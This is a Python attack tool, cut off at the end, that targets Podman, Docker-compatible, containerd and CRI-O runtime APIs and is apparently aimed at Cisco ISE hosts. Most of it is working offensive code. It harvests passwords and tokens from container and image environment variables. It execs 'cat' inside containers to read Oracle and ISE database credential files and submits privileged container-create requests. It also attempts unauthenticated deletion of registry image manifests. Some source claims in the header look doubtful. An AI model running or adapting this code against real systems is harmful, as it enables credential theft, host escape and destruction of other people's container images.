#!/usr/bin/env python3
"""
Podman Container Enumerator

Attacks Podman REST API via Unix socket (root: /run/podman/podman.sock,
rootless: /run/user/{uid}/podman/podman.sock) and optional TCP exposure.

Source: github.com/podman-container-tools/podman (Go 9M LOC).
Auth path: pkg/auth/auth.go — X-Registry-Auth = base64(JSON{username,password}).
ISE 3.1.0 uses Podman for internal service containers (Go ~8% of ISE binary).
"""

import os
import re
import sys
import json
import socket
import base64
import struct
import subprocess
import urllib.request
import urllib.error
from pathlib import Path
from typing import Optional


# ---------------------------------------------------------------------------
# Podman socket paths
# ---------------------------------------------------------------------------
PODMAN_SOCKET_ROOT      = '/run/podman/podman.sock'
PODMAN_SOCKET_ROOTLESS  = '/run/user/{uid}/podman/podman.sock'
PODMAN_SOCKET_ALT_PATHS = [
    '/var/run/podman/podman.sock',
    '/run/podman.sock',
]
DOCKER_COMPAT_SOCKET    = '/var/run/docker.sock'

# Default Podman REST API TCP exposure (when --module=podman-docker or
# systemd socket activation with TCP binding is used)
PODMAN_TCP_PORT = 8080
PODMAN_TCP_PORTS = [8080, 2375, 2376, 4243]

# ISE-specific paths where Podman containers mount host directories
ISE_CONTAINER_MOUNT_TARGETS = [
    '/opt/CSCOcpm',       # ISE application — config + certs
    '/opt/oracle',        # Oracle DB data dir
    '/etc/ise',           # ISE system config
    '/var/log/ise',       # Audit logs
    '/opt/timesten',      # TimesTen in-memory DB
]


# ---------------------------------------------------------------------------
# Unix HTTP client (no httpx/requests — pure stdlib)
# Source reference: libpod uses Unix socket HTTP per containers/common spec
# ---------------------------------------------------------------------------

class _UnixHTTPConnection:
    """HTTP/1.1 over Unix domain socket — mirrors Podman's REST client."""

    def __init__(self, socket_path: str, timeout: float = 8.0):
        self.socket_path = socket_path
        self.timeout     = timeout

    def _connect(self) -> socket.socket:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        s.connect(self.socket_path)
        return s

    def request(self, method: str, path: str,
                 body: Optional[bytes] = None,
                 headers: Optional[dict] = None) -> dict:
        hdrs = {
            'Host':       'localhost',
            'Connection': 'close',
            'Accept':     'application/json',
        }
        if headers:
            hdrs.update(headers)
        if body:
            hdrs['Content-Length'] = str(len(body))
            hdrs['Content-Type']   = 'application/json'

        request_line = f'{method} {path} HTTP/1.1\r\n'
        header_block = ''.join(f'{k}: {v}\r\n' for k, v in hdrs.items())
        raw = (request_line + header_block + '\r\n').encode()
        if body:
            raw += body

        try:
            s = self._connect()
            s.sendall(raw)
            # Read response
            buf = b''
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                buf += chunk
            s.close()

            # Parse HTTP response
            header_end = buf.find(b'\r\n\r\n')
            if header_end == -1:
                return {'status': 0, 'body': '', 'error': 'no header end'}
            status_line = buf[:buf.find(b'\r\n')].decode()
            status_code = int(status_line.split(' ')[1])
            body_bytes  = buf[header_end + 4:]
            body_str    = body_bytes.decode('utf-8', errors='replace')
            return {
                'status': status_code,
                'body':   body_str,
                'json':   _try_json(body_str),
            }
        except Exception as e:
            return {'status': 0, 'body': '', 'error': str(e)}


def _try_json(s: str):
    try:
        return json.loads(s)
    except Exception:
        return None


def _registry_auth_header(username: str, password: str,
                          registry: str = '') -> str:
    """Build X-Registry-Auth header value.
    Source: pkg/auth/auth.go — GetCredentials() decodes this from requests.
    Format: base64url(JSON{"username":"u","password":"p","serveraddress":"r"})
    """
    payload = json.dumps({
        'username':      username,
        'password':      password,
        'serveraddress': registry,
    }).encode()
    return base64.b64encode(payload).decode()


# ---------------------------------------------------------------------------
# Socket discovery
# ---------------------------------------------------------------------------

def find_podman_sockets() -> list:
    """Find all accessible Podman sockets on this host."""
    found = []
    # Root socket
    if Path(PODMAN_SOCKET_ROOT).exists():
        found.append({'path': PODMAN_SOCKET_ROOT, 'type': 'root'})
    # Alt paths
    for p in PODMAN_SOCKET_ALT_PATHS:
        if Path(p).exists():
            found.append({'path': p, 'type': 'alt'})
    # Docker compat socket
    if Path(DOCKER_COMPAT_SOCKET).exists():
        found.append({'path': DOCKER_COMPAT_SOCKET, 'type': 'docker-compat'})
    # Rootless sockets for all UIDs in /run/user/
    run_user = Path('/run/user')
    if run_user.exists():
        for uid_dir in run_user.iterdir():
            sock = uid_dir / 'podman' / 'podman.sock'
            if sock.exists():
                found.append({'path': str(sock), 'type': 'rootless',
                              'uid': uid_dir.name})
    return found


def _tcp_probe(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Main enumerator
# ---------------------------------------------------------------------------

class PodmanEnumerator:
    def __init__(self, socket_path: Optional[str] = None,
                 tcp_host: Optional[str] = None, tcp_port: int = 8080,
                 timeout: float = 8.0):
        self.socket_path = socket_path
        self.tcp_host    = tcp_host
        self.tcp_port    = tcp_port
        self.timeout     = timeout
        self.findings    = []
        self._client     = None

    def _get_client(self) -> Optional[_UnixHTTPConnection]:
        if self._client:
            return self._client
        if self.socket_path and Path(self.socket_path).exists():
            self._client = _UnixHTTPConnection(self.socket_path, self.timeout)
            return self._client
        return None

    def _api(self, path: str, method: str = 'GET',
              body: Optional[dict] = None) -> dict:
        client = self._get_client()
        if not client:
            return {'status': 0, 'error': 'no socket'}
        raw_body = json.dumps(body).encode() if body else None
        return client.request(method, path, body=raw_body)

    # -- info ---------------------------------------------------------------

    def get_version(self) -> dict:
        r = self._api('/v5.0.0/libpod/version')
        if r['status'] == 200 and r.get('json'):
            v = r['json']
            self.findings.append({
                'severity': 'INFO',
                'title':    'Podman Version',
                'detail':   f"Version={v.get('Version','')} APIVersion={v.get('ApiVersion','')} Os={v.get('Os','')}",
            })
        return r.get('json') or {}

    def get_info(self) -> dict:
        r = self._api('/v5.0.0/libpod/info')
        if r['status'] == 200 and r.get('json'):
            info = r['json']
            store = info.get('store', {})
            self.findings.append({
                'severity': 'HIGH',
                'title':    'Podman Info — Storage Config',
                'detail':   (f"graphRoot={store.get('graphRoot','')} "
                             f"driver={store.get('graphDriverName','')} "
                             f"imageStore={store.get('imageStore',{}).get('number','')} images"),
            })
        return r.get('json') or {}

    # -- containers ---------------------------------------------------------

    def list_containers(self) -> list:
        r = self._api('/v5.0.0/libpod/containers/json?all=true')
        containers = r.get('json') or []
        if containers:
            self.findings.append({
                'severity': 'HIGH',
                'title':    f'Podman: {len(containers)} Container(s) Accessible',
                'detail':   f"Running={sum(1 for c in containers if c.get('State')=='running')} Names={[c.get('Names',['?'])[0] for c in containers[:10]]}",
            })
        return containers

    def inspect_container(self, cid: str) -> dict:
        r = self._api(f'/v5.0.0/libpod/containers/{cid}/json')
        return r.get('json') or {}

    def get_container_env(self, cid: str) -> list:
        """Extract environment variables — primary credential source."""
        data = self.inspect_container(cid)
        config = data.get('Config', {}) or data.get('config', {})
        env = config.get('Env', []) or []
        return env

    def check_container_mounts(self, cid: str) -> list:
        """Find containers mounting ISE host paths — direct data access."""
        data = self.inspect_container(cid)
        mounts = data.get('Mounts', [])
        dangerous = []
        for m in mounts:
            src = m.get('Source', '')
            dst = m.get('Destination', '')
            mode = m.get('Mode', '')
            is_dangerous = (
                src.startswith('/etc') or
                src.startswith('/opt/CSCOcpm') or
                src.startswith('/opt/oracle') or
                src in ISE_CONTAINER_MOUNT_TARGETS or
                (src == '/' and 'ro' not in mode)
            )
            if is_dangerous:
                dangerous.append({'src': src, 'dst': dst, 'mode': mode})
        return dangerous

    def check_privileged_containers(self, containers: list) -> list:
        """Flag privileged containers — direct host escape path."""
        privileged = []
        for c in containers:
            cid   = c.get('Id', '')
            names = c.get('Names', ['?'])
            data  = self.inspect_container(cid)

            hp = data.get('HostConfig', {})
            is_priv = hp.get('Privileged', False)
            caps    = hp.get('CapAdd', []) or []
            dangerous_caps = {'SYS_ADMIN', 'NET_ADMIN', 'SYS_PTRACE',
                              'SYS_MODULE', 'DAC_OVERRIDE', 'SETUID', 'SETGID'}
            has_dangerous = bool(set(caps) & dangerous_caps)
            mounts = self.check_container_mounts(cid)

            if is_priv or has_dangerous or mounts:
                entry = {
                    'id':         cid[:12],
                    'name':       names[0] if names else '?',
                    'privileged': is_priv,
                    'caps':       [c for c in caps if c in dangerous_caps],
                    'host_mounts': mounts,
                }
                privileged.append(entry)
                sev = 'CRITICAL' if (is_priv or mounts) else 'HIGH'
                self.findings.append({
                    'severity': sev,
                    'title':    f"Podman: Privileged/Dangerous Container {names[0] if names else cid[:12]}",
                    'detail':   str(entry)[:300],
                })
        return privileged

    def harvest_container_secrets(self, containers: list) -> list:
        """Extract env vars from all containers — primary cred harvest."""
        _SECRET_RE = re.compile(
            r'(password|passwd|secret|token|key|api_key|auth|credential|'
            r'jdbc|db_pass|dbpass|oracle_pass|tacacs|radius_secret)',
            re.IGNORECASE
        )
        all_secrets = []
        for c in containers:
            cid   = c.get('Id', '')
            names = c.get('Names', ['?'])
            env   = self.get_container_env(cid)
            for var in env:
                if _SECRET_RE.search(var):
                    all_secrets.append({
                        'container': names[0] if names else cid[:12],
                        'var':       var[:200],
                    })
        if all_secrets:
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    f"Podman: {len(all_secrets)} Secret Env Vars in Containers",
                'detail':   str(all_secrets[:10])[:400],
            })
        return all_secrets

    # -- images -------------------------------------------------------------

    def list_images(self) -> list:
        r = self._api('/v5.0.0/libpod/images/json')
        images = r.get('json') or []
        if images:
            names = []
            for img in images[:20]:
                names.extend(img.get('Names') or img.get('RepoTags') or [])
            self.findings.append({
                'severity': 'INFO',
                'title':    f'Podman: {len(images)} Image(s) Available',
                'detail':   str(names[:15]),
            })
        return images

    def inspect_image_config(self, image_id: str) -> dict:
        """Image config may contain ENV credentials baked into layers."""
        r = self._api(f'/v5.0.0/libpod/images/{image_id}/json')
        data = r.get('json') or {}
        config = data.get('Config', {})
        env = config.get('Env', [])
        _SECRET_RE = re.compile(
            r'(password|passwd|secret|token|api_key|jdbc|oracle|tacacs)',
            re.IGNORECASE
        )
        baked_creds = [e for e in env if _SECRET_RE.search(e)]
        if baked_creds:
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    f'Podman: Credentials Baked into Image {image_id[:12]}',
                'detail':   str(baked_creds[:5])[:300],
            })
        return {'config': config, 'baked_creds': baked_creds}

    # -- exec (if socket accessible) ----------------------------------------

    def exec_in_container(self, cid: str, cmd: list) -> dict:
        """
        Create exec instance in running container — full command execution.
        Source: libpod/container_exec.go — ExecCreate + ExecStart.
        Requires container running, socket writable.
        """
        # Create exec
        create_r = self._api(
            f'/v5.0.0/libpod/containers/{cid}/exec',
            method='POST',
            body={
                'AttachStdout': True,
                'AttachStderr': True,
                'Cmd':          cmd,
            }
        )
        if create_r['status'] != 201:
            return {'error': f'exec create failed: {create_r["status"]}'}

        exec_id = (create_r.get('json') or {}).get('Id', '')
        if not exec_id:
            return {'error': 'no exec id'}

        # Start exec
        start_r = self._api(
            f'/v5.0.0/libpod/exec/{exec_id}/start',
            method='POST',
            body={'Detach': False}
        )
        return {'exec_id': exec_id, 'output': start_r.get('body', ''),
                'status': start_r['status']}

    def harvest_oracle_creds_via_exec(self, containers: list) -> list:
        """
        Find Oracle-related containers and extract DB creds via exec.
        Target: ISE Oracle/TimesTen containers.
        """
        oracle_creds = []
        oracle_patterns = re.compile(r'oracle|ise|cpm|timesten|db', re.IGNORECASE)
        for c in containers:
            cid   = c.get('Id', '')
            names = c.get('Names', ['?'])
            state = c.get('State', '')
            if state != 'running':
                continue
            if not any(oracle_patterns.search(n) for n in names):
                continue
            # Try to read ISE Oracle config files
            for path in ['/opt/CSCOcpm/conf/ise_oracle.properties',
                         '/opt/CSCOcpm/conf/props/database.properties',
                         '/etc/oracle/oracle.conf']:
                r = self.exec_in_container(cid, ['cat', path])
                if r.get('status') == 200 and r.get('output'):
                    oracle_creds.append({
                        'container': names[0],
                        'file':      path,
                        'content':   r['output'][:500],
                    })
        return oracle_creds

    # -- TCP socket ---------------------------------------------------------

    def probe_tcp_api(self) -> dict:
        """Check for Podman REST API exposed over TCP (misconfigured daemon)."""
        results = {}
        hosts = [self.tcp_host or 'localhost', '0.0.0.0']
        for host in hosts:
            for port in PODMAN_TCP_PORTS:
                if _tcp_probe(host, port, timeout=1.5):
                    results[f'{host}:{port}'] = 'OPEN'
                    self.findings.append({
                        'severity': 'CRITICAL',
                        'title':    f'Podman TCP API Exposed ({host}:{port})',
                        'detail':   ('Podman REST API accessible over TCP without TLS — '
                                     'full container control without auth'),
                    })
        return results

    # -- Podman secret store ------------------------------------------------

    def list_secrets(self) -> list:
        """Podman secret store — named secrets injected into containers."""
        r = self._api('/v5.0.0/libpod/secrets/json')
        secrets = r.get('json') or []
        if secrets:
            self.findings.append({
                'severity': 'HIGH',
                'title':    f'Podman Secret Store: {len(secrets)} named secrets',
                'detail':   str([s.get('Spec',{}).get('Name','?') for s in secrets]),
            })
        # Inspect each secret (value not returned by API for security,
        # but name leaks usage; exec into container to read /run/secrets/)
        return secrets

    # -- orchestrator -------------------------------------------------------

    def run(self, exec_oracle: bool = False) -> dict:
        result = {
            'socket_path':    self.socket_path,
            'version':        {},
            'info':           {},
            'containers':     [],
            'privileged':     [],
            'secrets_env':    [],
            'images':         [],
            'secrets':        [],
            'tcp_exposure':   {},
            'oracle_creds':   [],
            'findings':       [],
        }

        if not self._get_client():
            result['error'] = f'socket not accessible: {self.socket_path}'
            return result

        result['version']      = self.get_version()
        result['info']         = self.get_info()
        result['containers']   = self.list_containers()
        result['images']       = self.list_images()
        result['secrets']      = self.list_secrets()
        result['tcp_exposure'] = self.probe_tcp_api()

        if result['containers']:
            result['privileged']  = self.check_privileged_containers(result['containers'])
            result['secrets_env'] = self.harvest_container_secrets(result['containers'])

        if exec_oracle and result['containers']:
            result['oracle_creds'] = self.harvest_oracle_creds_via_exec(result['containers'])

        result['findings'] = self.findings
        return result


# ---------------------------------------------------------------------------
# Multi-socket sweep
# ---------------------------------------------------------------------------

def enumerate_podman(exec_oracle: bool = False) -> dict:
    """Find all Podman sockets on this host and enumerate each."""
    sockets = find_podman_sockets()
    result  = {'sockets_found': sockets, 'results': []}

    for sock in sockets:
        enum = PodmanEnumerator(socket_path=sock['path'])
        r    = enum.run(exec_oracle=exec_oracle)
        r['socket_meta'] = sock
        result['results'].append(r)

    return result


# ---------------------------------------------------------------------------
# Standalone probe functions (no socket required — use TCP or /proc)
# ---------------------------------------------------------------------------

def probe_podman_api(host: str = 'localhost', port: int = 8080,
                     timeout: float = 5.0) -> list:
    """
    Probe Podman REST API over TCP and (for localhost) the Unix socket.

    Sources:
    - libpod REST spec v3.0.0: /v3.0.0/libpod/{info,containers,pods}
    - containers/podman pkg/api: privileged create body matches HostConfig.Privileged
    - ch08 (cloud-native-devops-kubernetes-2e): container namespaces / privilege model
    """
    findings = []

    def _http_get(url: str, method: str = 'GET',
                  body: bytes = None) -> tuple:
        """Return (status_code, response_body_bytes). Never raises."""
        try:
            req = urllib.request.Request(url, data=body, method=method)
            req.add_header('Accept', 'application/json')
            if body:
                req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.getcode(), r.read()
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return 0, b''

    base = f'http://{host}:{port}'

    # /v3.0.0/libpod/info — unauthenticated access = full daemon control
    status, body = _http_get(f'{base}/v3.0.0/libpod/info')
    if status == 200 and body:
        try:
            data = json.loads(body)
        except Exception:
            data = {}
        detail = (f'host={host}:{port} '
                  f'version={data.get("version", {}).get("Version", "?")} '
                  f'os={data.get("version", {}).get("Os", "?")}')
        findings.append({
            'severity': 'CRITICAL',
            'title':    'PODMAN_API_UNAUTH — full container control',
            'detail':   detail,
            'host':     host,
            'port':     port,
        })

    # /v3.0.0/libpod/containers/json
    status, body = _http_get(f'{base}/v3.0.0/libpod/containers/json')
    if status == 200 and body:
        try:
            containers = json.loads(body)
            count = len(containers) if isinstance(containers, list) else '?'
        except Exception:
            count = '?'
        findings.append({
            'severity': 'CRITICAL',
            'title':    'PODMAN_CONTAINER_LIST_UNAUTH',
            'detail':   f'host={host}:{port} containers={count}',
            'host':     host,
            'port':     port,
        })

    # /v3.0.0/libpod/pods/json
    status, body = _http_get(f'{base}/v3.0.0/libpod/pods/json')
    if status == 200 and body:
        try:
            pods = json.loads(body)
            count = len(pods) if isinstance(pods, list) else '?'
        except Exception:
            count = '?'
        findings.append({
            'severity': 'HIGH',
            'title':    'PODMAN_POD_LIST_UNAUTH',
            'detail':   f'host={host}:{port} pods={count}',
            'host':     host,
            'port':     port,
        })

    # POST privileged container create — ch08: privileged = full host namespace access
    priv_body = json.dumps({
        'image':      'busybox',
        'command':    ['/bin/sh'],
        'HostConfig': {'Privileged': True},
    }).encode()
    status, _ = _http_get(
        f'{base}/v3.0.0/libpod/containers/create',
        method='POST', body=priv_body,
    )
    # 201 = created, 400 = bad request but API is open, 404 = image missing but API open
    if status in (201, 400, 404):
        findings.append({
            'severity': 'HIGH',
            'title':    'PODMAN_PRIVILEGED_CONTAINER_CREATE',
            'detail':   (f'host={host}:{port} POST /containers/create accepted '
                         f'(status={status}) — privileged container submission unblocked'),
            'host':     host,
            'port':     port,
        })

    # Unix socket path for localhost — mirrors Podman rootless/root default paths
    if host == 'localhost':
        sock_candidates = [
            '/run/podman/podman.sock',
            '/var/run/podman/podman.sock',
        ]
        uid = os.getuid()
        if uid != 0:
            sock_candidates.append(f'/run/user/{uid}/podman/podman.sock')

        for sock_path in sock_candidates:
            if not os.path.exists(sock_path):
                continue
            # Probe /info over the Unix socket directly
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect(sock_path)
                req_bytes = (
                    b'GET /v3.0.0/libpod/info HTTP/1.1\r\n'
                    b'Host: localhost\r\n'
                    b'Accept: application/json\r\n'
                    b'Connection: close\r\n\r\n'
                )
                s.sendall(req_bytes)
                resp = b''
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                s.close()
                if b'HTTP/1.1 200' in resp or b'HTTP/1.0 200' in resp:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'PODMAN_UNIX_SOCKET_UNAUTH',
                        'detail':   f'socket={sock_path} — unauthenticated /info readable',
                        'host':     'localhost',
                        'port':     0,
                    })
            except Exception:
                pass

    return findings


def check_podman_rootless_escape() -> list:
    """
    Check /proc for user namespace and capability indicators.

    Sources:
    - ch08 (cloud-native-devops-kubernetes-2e): rootless containers, uid_map,
      Linux capabilities, runAsNonRoot, privilege escalation surface
    - kernel user_namespaces(7): uid_map format, setuid helper binaries
    """
    findings = []

    # /proc/self/uid_map — "0 0 ..." means root in container = root on host
    try:
        with open('/proc/self/uid_map') as f:
            uid_map = f.read().strip()
        # Format: inner_uid  outer_uid  count
        # If outer_uid == 0 and inner_uid == 0 → not rootless
        for line in uid_map.splitlines():
            parts = line.split()
            if len(parts) >= 2 and parts[0].strip() == '0' and parts[1].strip() == '0':
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ROOT_UID_MAP — not rootless',
                    'detail':   f'uid_map={uid_map!r} — container UID 0 maps to host UID 0',
                    'host':     'localhost',
                    'port':     0,
                })
                break
    except Exception:
        pass

    # /proc/self/status — CapEff bitmask; bit 0 = CAP_CHOWN (0x1)
    try:
        with open('/proc/self/status') as f:
            status_text = f.read()
        for line in status_text.splitlines():
            if line.startswith('CapEff:'):
                cap_hex = line.split(':', 1)[1].strip()
                cap_eff = int(cap_hex, 16)
                if cap_eff & 0x1:  # CAP_CHOWN bit
                    findings.append({
                        'severity': 'MEDIUM',
                        'title':    'ROOTLESS_CAP_CHOWN',
                        'detail':   (f'CapEff=0x{cap_hex} — CAP_CHOWN present in rootless context; '
                                     'allows chowning arbitrary files to container uid'),
                        'host':     'localhost',
                        'port':     0,
                    })
                break
    except Exception:
        pass

    # /proc/self/cgroup — user.slice indicates systemd user session (rootless)
    try:
        with open('/proc/self/cgroup') as f:
            cgroup_text = f.read()
        if 'user.slice' in cgroup_text:
            findings.append({
                'severity': 'INFO',
                'title':    'ROOTLESS_CGROUP_CONFIRMED',
                'detail':   'cgroup contains user.slice — running in rootless (user-session) context',
                'host':     'localhost',
                'port':     0,
            })
    except Exception:
        pass

    # newuidmap/newgidmap SUID check — setuid helpers enable user namespace pivots
    for binary in ('/usr/bin/newuidmap', '/usr/bin/newgidmap',
                   '/usr/sbin/newuidmap', '/usr/sbin/newgidmap'):
        try:
            st = os.stat(binary)
            if st.st_mode & 0o4000:  # SUID bit
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'NEWUIDMAP_SUID — user namespace pivot',
                    'detail':   (f'{binary} is SUID (mode=0{oct(st.st_mode)[-4:]}) — '
                                 'allows unprivileged user namespace creation; pivot path to '
                                 'host uid remapping'),
                    'host':     'localhost',
                    'port':     0,
                })
        except FileNotFoundError:
            pass
        except Exception:
            pass

    return findings


def check_container_network_isolation() -> list:
    """
    Assess network namespace isolation via /proc.

    Sources:
    - ch08 (cloud-native-devops-kubernetes-2e): container networking, bridge
      interfaces (podman0/cni0/docker0), network namespaces as isolation boundary
    - kernel network_namespaces(7): distinct inodes in /proc/*/ns/net
    """
    findings = []

    # Count distinct network namespace inodes via /proc/*/ns/net
    net_ns_inodes = set()
    try:
        for entry in os.listdir('/proc'):
            if not entry.isdigit():
                continue
            ns_path = f'/proc/{entry}/ns/net'
            try:
                st = os.stat(ns_path)
                net_ns_inodes.add(st.st_ino)
            except Exception:
                continue
        if len(net_ns_inodes) < 2:
            findings.append({
                'severity': 'MEDIUM',
                'title':    'SINGLE_NETWORK_NS — no container isolation',
                'detail':   (f'distinct net namespace inodes={len(net_ns_inodes)} — '
                             'all visible processes share one network namespace; '
                             'no container network isolation observed'),
                'host':     'localhost',
                'port':     0,
            })
    except Exception:
        pass

    # Check for container bridge interfaces (podman0, cni0, docker0)
    bridge_found = []
    for net_file in ('/proc/net/dev', '/proc/net/if_inet6'):
        try:
            with open(net_file) as f:
                content = f.read()
            for iface in ('podman0', 'cni0', 'docker0', 'br-'):
                if iface in content:
                    bridge_found.append(iface)
            if bridge_found:
                break
        except Exception:
            continue
    if bridge_found:
        findings.append({
            'severity': 'INFO',
            'title':    'CONTAINER_BRIDGE_PRESENT',
            'detail':   f'bridge interfaces detected: {list(set(bridge_found))}',
            'host':     'localhost',
            'port':     0,
        })

    # /proc/net/ip_tables_matches — if DOCKER/PODMAN chains missing = no firewall isolation
    try:
        with open('/proc/net/ip_tables_matches') as f:
            ipt_content = f.read()
        # DOCKER and PODMAN iptables chains write match entries; absence = no rules loaded
        has_container_rules = any(
            kw in ipt_content for kw in ('DOCKER', 'PODMAN', 'CNI')
        )
        if not has_container_rules:
            findings.append({
                'severity': 'HIGH',
                'title':    'NO_CONTAINER_FIREWALL_RULES',
                'detail':   ('/proc/net/ip_tables_matches contains no DOCKER/PODMAN/CNI '
                             'entries — container iptables rules not loaded; inter-container '
                             'traffic and host port exposure unfiltered'),
                'host':     'localhost',
                'port':     0,
            })
    except Exception:
        pass

    return findings


def probe_container_registry_v2(host: str, port: int = 5000,
                                 timeout: float = 5.0) -> list:
    """
    Probe a Docker Distribution / OCI container registry (v2 API).

    Sources:
    - Docker Distribution spec: /v2/, /v2/_catalog, /v2/{name}/tags/list,
      DELETE /v2/{name}/manifests/{digest}
    - ch08 (cloud-native-devops-kubernetes-2e): image registries, image pull,
      imagePullSecrets — unauthenticated registry = full image exfil + poisoning
    """
    findings = []

    def _registry_req(path: str, method: str = 'GET',
                      body: bytes = None) -> tuple:
        """Return (status_code, body_bytes). Never raises."""
        url = f'http://{host}:{port}{path}'
        try:
            req = urllib.request.Request(url, data=body, method=method)
            req.add_header('Accept', 'application/json')
            if body:
                req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.getcode(), r.read()
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return 0, b''

    # /v2/ — 200 without WWW-Authenticate = open registry
    status, body = _registry_req('/v2/')
    if status == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'REGISTRY_V2_OPEN',
            'detail':   f'host={host}:{port} GET /v2/ returned 200 without auth challenge',
            'host':     host,
            'port':     port,
        })
    elif status == 0:
        # Port not reachable — nothing to enumerate
        return findings

    # /v2/_catalog — full repository list
    status, body = _registry_req('/v2/_catalog')
    if status == 200 and body:
        try:
            catalog = json.loads(body)
            repos = catalog.get('repositories', [])
        except Exception:
            repos = []
        findings.append({
            'severity': 'CRITICAL',
            'title':    'REGISTRY_CATALOG_EXPOSED',
            'detail':   f'host={host}:{port} repositories={repos[:20]}',
            'host':     host,
            'port':     port,
        })

        # For each discovered repo, list tags
        for repo in repos[:5]:  # cap at 5 to avoid flooding
            status2, body2 = _registry_req(f'/v2/{repo}/tags/list')
            if status2 == 200 and body2:
                try:
                    tag_data = json.loads(body2)
                    tags = tag_data.get('tags', [])
                except Exception:
                    tags = []
                findings.append({
                    'severity': 'HIGH',
                    'title':    'IMAGE_TAGS_READABLE',
                    'detail':   f'host={host}:{port} repo={repo} tags={tags[:10]}',
                    'host':     host,
                    'port':     port,
                })

                # For each tag get the manifest digest, then try DELETE
                for tag in (tags or [])[:2]:  # sample 2 tags max
                    # GET manifest to extract digest
                    mreq = urllib.request.Request(
                        f'http://{host}:{port}/v2/{repo}/manifests/{tag}',
                        method='GET',
                    )
                    mreq.add_header(
                        'Accept',
                        'application/vnd.docker.distribution.manifest.v2+json'
                    )
                    digest = None
                    try:
                        with urllib.request.urlopen(mreq, timeout=timeout) as mr:
                            digest = mr.headers.get('Docker-Content-Digest', '')
                    except Exception:
                        pass
                    if not digest:
                        continue
                    # DELETE /v2/{repo}/manifests/{digest}
                    del_status, _ = _registry_req(
                        f'/v2/{repo}/manifests/{digest}',
                        method='DELETE',
                    )
                    if del_status == 202:
                        findings.append({
                            'severity': 'CRITICAL',
                            'title':    'REGISTRY_DELETE_UNAUTH — image deletion possible',
                            'detail':   (f'host={host}:{port} DELETE /v2/{repo}/manifests/{digest} '
                                         f'returned 202 — unauth image deletion confirmed'),
                            'host':     host,
                            'port':     port,
                        })

    elif status == 200:
        # /v2/ open but _catalog empty or non-JSON
        pass

    return findings


# ---------------------------------------------------------------------------
# containerd / CRI-O runtime surface
# ---------------------------------------------------------------------------

def probe_containerd_api(host: str, port: int = 1338,
                         timeout: float = 5.0) -> list:
    """
    Probe exposed containerd and CRI-O container runtime APIs.

    Sources:
    - Kubernetes ch02 (creating-and-running-containers): containerd is the
      default CRI runtime since K8s 1.24; CRI-O is an alternative OCI runtime.
      Either runtime daemon exposing its management surface unauthenticated
      grants full container lifecycle control to anonymous callers.
    - containerd HTTP API (port 1338 metrics/debug endpoint, optional TCP):
      GET /v1/containers lists all running containers across all namespaces;
      GET /v1/snapshots enumerates cached filesystem layers (snapshot store).
    - Docker-compatible shim on TCP/2376: when containerd runs with the
      docker-shim or when Docker Engine is reconfigured to expose TCP without
      TLS, GET /v1.41/containers/json returns the full container list.
    - Unix socket permission checks: /run/containerd/containerd.sock and
      /run/crio/crio.sock — world-writable socket = any local user can issue
      runtime commands (create, start, delete, exec).

    Checks performed (no external dependencies — stdlib only):
      1. GET /v1/containers  on host:port    -> CRITICAL if container list returned
      2. GET /v1/snapshots   on host:port    -> HIGH if snapshot list returned
      3. stat /run/containerd/containerd.sock -> CRITICAL if world-writable
      4. GET /v1.41/containers/json on host:2376 -> CRITICAL if JSON array returned
      5. stat /run/crio/crio.sock            -> CRITICAL if world-writable

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    def _http_get(h: str, p: int, path: str) -> tuple:
        """Return (status_code, parsed_json_or_None). Never raises."""
        url = f'http://{h}:{p}{path}'
        try:
            req = urllib.request.Request(url, method='GET')
            req.add_header('Accept', 'application/json')
            with urllib.request.urlopen(req, timeout=timeout) as r:
                raw = r.read()
                try:
                    return r.getcode(), json.loads(raw)
                except Exception:
                    return r.getcode(), None
        except urllib.error.HTTPError as e:
            return e.code, None
        except Exception:
            return 0, None

    def _is_world_writable(path: str) -> bool:
        """Return True if path exists and its mode has world-write bit set."""
        try:
            mode = os.stat(path).st_mode
            return bool(mode & 0o002)
        except Exception:
            return False

    # ------------------------------------------------------------------
    # 1. containerd HTTP API — GET /v1/containers
    # ------------------------------------------------------------------
    status, body = _http_get(host, port, '/v1/containers')
    if status == 200 and body is not None:
        containers = body if isinstance(body, list) else body.get('containers', [])
        findings.append({
            'severity': 'CRITICAL',
            'title':    'CONTAINERD_API_UNAUTH — full container runtime control',
            'detail':   (f'host={host}:{port} GET /v1/containers returned 200 '
                         f'without auth — {len(containers)} container(s) visible; '
                         f'runtime create/delete/exec available to anonymous callers'),
            'host':     host,
            'port':     port,
        })

    # ------------------------------------------------------------------
    # 2. containerd snapshot store — GET /v1/snapshots
    # ------------------------------------------------------------------
    status2, body2 = _http_get(host, port, '/v1/snapshots')
    if status2 == 200 and body2 is not None:
        snapshots = body2 if isinstance(body2, list) else body2.get('snapshots', [])
        findings.append({
            'severity': 'HIGH',
            'title':    'CONTAINERD_SNAPSHOTS_UNAUTH — filesystem layer access',
            'detail':   (f'host={host}:{port} GET /v1/snapshots returned 200 '
                         f'— {len(snapshots)} snapshot(s) enumerable; '
                         f'overlay filesystem layers readable without auth'),
            'host':     host,
            'port':     port,
        })

    # ------------------------------------------------------------------
    # 3. containerd Unix socket world-writable
    # ------------------------------------------------------------------
    containerd_sock = '/run/containerd/containerd.sock'
    if _is_world_writable(containerd_sock):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'CONTAINERD_SOCKET_WRITABLE',
            'detail':   (f'{containerd_sock} is world-writable — any local user '
